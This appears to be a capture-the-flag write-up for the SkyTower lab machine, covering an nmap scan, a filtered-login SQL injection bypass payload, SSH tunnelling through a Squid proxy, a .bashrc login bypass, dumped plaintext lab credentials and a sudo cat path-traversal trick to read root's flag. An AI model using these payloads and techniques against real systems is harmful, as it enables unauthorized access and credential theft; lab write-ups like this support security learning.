# Skytower
### Credentials
```
john:hereisjohn

MySQL dump
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
```
## Nmap Scan
```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.2.22 ((Debian))
3128/tcp open  http-proxy Squid http proxy 3.1.20
MAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)
```
## Web Enumeration
__Port 80__
Login form vulnerable to SQL injection with a filter bypass.
* Filtering was occuring where the characters ' OR = -- were removed so the payload ' || 1=1# was used instead and it passed the filter
## Foothold / Privilege Escalation
When I broke in through the login panel I saw a pair of ssh credentials, but there was no open SSH  port on the machine? But there is a squid proxy on the server running on port 3128.
Using this proxy and the “proxytunnel” tool I can proxy the machine’s own SSH server to my port 1234 and connect to it through their proxy;
```
proxytunnel -p 192.168.1.233:3128 -d 127.0.0.1:22 -a 1234
The -a flag means the connection will daemonize on port 1234 so it can keep itself alive
```
SSH connection logs out immediately after connecting, so there must be something inside the .bashrc file. I can bypass this with the /bin/bash parameter when executing the ssh command, which means I get dropped directly into a bash shell upon connecting. Using this I can delete the .bashrc file and login normally.
### Machine Enumeration
```
#! ARCHITECTURE !#
ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs),
for GNU/Linux 2.6.26, BuildID[sha1]=0x5bb332752cc304fa7fbb838bdf7d7766ffc7a8a1, stripped

Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64 GNU/Linux
PRETTY_NAME="Debian GNU/Linux 7 (wheezy)"
NAME="Debian GNU/Linux"
VERSION_ID="7"
VERSION="7 (wheezy)"
ID=debian
ANSI_COLOR="1;31"
HOME_URL="http://www.debian.org/"
SUPPORT_URL="http://www.debian.org/support/"
BUG_REPORT_URL="http://bugs.debian.org/"
```
Inside the login.php were hardcoded MySQL credentials which I used to dump the contents and find all users credentials stored in plain text.
### Privilege Escalation
When I made a lateral move to the user “sara” I ran sudo -l, and it returned that the user sara can run "cat" on the /accounts directory so I used a simple trick __cat /accounts../../root/flag.txt__ to get the root flag which contained the root password.
